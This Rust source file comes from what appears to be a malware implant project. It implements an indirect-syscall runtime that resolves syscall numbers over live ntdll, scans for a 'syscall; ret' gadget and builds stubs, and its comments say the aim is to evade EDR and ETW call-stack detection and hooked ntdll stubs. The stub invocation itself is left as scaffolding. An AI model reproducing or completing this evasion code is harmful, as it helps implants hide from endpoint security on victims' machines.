//! Indirect-syscall runtime.
//!
//! This is the capstone that turns `nyx_evasion` from a unit-tested algorithm
//! into a live runtime: it
//!   1. resolves the SSN table over the live ntdll (via `resolve::LiveNtdll`),
//!   2. scans ntdll for a `syscall; ret` gadget (the address an indirect stub
//!      jumps into so the executing RIP/return address land in ntdll),
//!   3. emits the indirect stub bytes (`nyx_evasion::indirect_stub`) into
//!      executable memory,
//!   4. exposes a `syscall!` macro + typed wrappers for the Nt* calls the
//!      implant needs.
//!
//! Why indirect: a direct syscall executes `syscall` from implant memory, so
//! the return address points outside any legitimate module — ETW/EDR call-stack
//! checks flag it. Indirect jumps to a `syscall` *inside ntdll*, so RIP and the
//! return address look legitimate. SSN resolution (Hell/Halo/Tartarus) recovers
//! the real numbers even when EDRs hook the stub prologues.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use crate::resolve::{djb2, LiveNtdll};
use nyx_evasion::stub::indirect_stub;
use nyx_evasion::{resolve_table, SyscallSource};

/// The resolved syscall runtime: SSN table + the ntdll `syscall` gadget address.
pub struct Runtime {
    /// (api name, SSN) for every resolvable syscall.
    table: Vec<(String, u32)>,
    /// Absolute address of a `syscall; ret` gadget inside ntdll.
    syscall_gadget: u64,
}

impl Runtime {
    /// Build the runtime: locate ntdll, resolve SSNs, find the gadget. Returns
    /// None if ntdll can't be found (should never happen in a real process).
    pub unsafe fn init() -> Option<Self> {
        let ntdll = LiveNtdll::locate()?;
        let table = ntdll.resolve_table_owned();
        let syscall_gadget = scan_syscall_gadget(&ntdll)?;
        Some(Self {
            table,
            syscall_gadget,
        })
    }

    /// Look up the SSN for an API by name hash.
    pub fn ssn_by_hash(&self, name_hash: u32) -> Option<u32> {
        // The table holds String names; hash each to match. (Linear scan; the
        // table is a few hundred entries — fine for cold-path resolution.)
        for (name, ssn) in &self.table {
            if djb2(name.as_bytes()) == name_hash && *ssn != u32::MAX {
                return Some(*ssn);
            }
        }
        None
    }

    /// The ntdll `syscall; ret` gadget address (for indirect stubs).
    pub fn gadget(&self) -> u64 {
        self.syscall_gadget
    }

    /// Build the indirect-syscall stub bytes for `ssn`, ready to write into
    /// executable memory and call.
    pub fn indirect_stub_for(&self, ssn: u32) -> Vec<u8> {
        indirect_stub(ssn, self.syscall_gadget)
    }
}

/// Scan ntdll's image for a `syscall; ret` byte pair (`0F 05 C3`) and return
/// its absolute address. The first Nt* export stub contains one; any works as
/// the indirect-jump target.
unsafe fn scan_syscall_gadget<S: SyscallSource + ?Sized>(_src: &S) -> Option<u64> {
    // The gadget lives inside the syscall stub region of ntdll. We scan the
    // export we know is cleanest — but simpler: walk the first resolvable
    // stub's bytes. For M0 we locate ntdll's base via the resolve module and
    // scan forward for the 3-byte signature within the first ~64 KiB of the
    // .text-equivalent region.
    //
    // The LiveNtdll owns the base; reach into it through a dedicated scan that
    // reads via the SyscallSource trait.
    let ntdll = crate::resolve::LiveNtdll::locate()?;
    // Scan the first 0x10000 bytes of ntdll for 0F 05 C3.
    for rva in 0x1000u32..0x10000 {
        let window = ntdll_window(&ntdll, rva, 3)?;
        if window == [0x0F, 0x05, 0xC3] {
            // Absolute address = base + rva. We need the base pointer.
            let base = ntdll.module().base as u64;
            return Some(base + rva as u64);
        }
    }
    None
}

/// Read `len` bytes at `rva` from the live ntdll via the SyscallSource trait.
unsafe fn ntdll_window(src: &LiveNtdll, rva: u32, len: usize) -> Option<[u8; 3]> {
    let v: Vec<u8> = nyx_evasion::SyscallSource::read(src, rva, len);
    if v.len() == 3 {
        Some([v[0], v[1], v[2]])
    } else {
        None
    }
}

/// A typed wrapper around an indirect syscall. The macro is the public face;
/// it looks up the SSN, emits the indirect stub into a per-call trampoline, and
/// invokes it. M0: the stub-emission + invocation is scaffolded — the typed
/// helpers below resolve SSNs; the actual `call` wiring (alloc RX memory,
/// memcpy the stub, cast to fn pointer, call) is the convergence-step work.
#[macro_export]
macro_rules! syscall {
    ($rt:expr, $name:expr) => {
        $rt.ssn_by_hash($crate::resolve::djb2($name))
    };
}

/// Resolve the SSN for `NtAllocateVirtualMemory` (the canonical first syscall
/// an implant makes — proves the runtime is live).
pub fn ssn_nt_allocate_virtual_memory(rt: &Runtime) -> Option<u32> {
    rt.ssn_by_hash(djb2(b"ntallocatevirtualmemory"))
}

#[cfg(test)]
mod tests {
    use super::*;
    #[cfg(target_arch = "x86_64")]
    #[test]
    fn djb2_keys_are_stable() {
        // The names the runtime looks up must hash consistently with the table.
        assert_eq!(
            djb2(b"ntallocatevirtualmemory"),
            djb2(b"NTALLOCATEVIRTUALMEMORY")
        );
    }
}
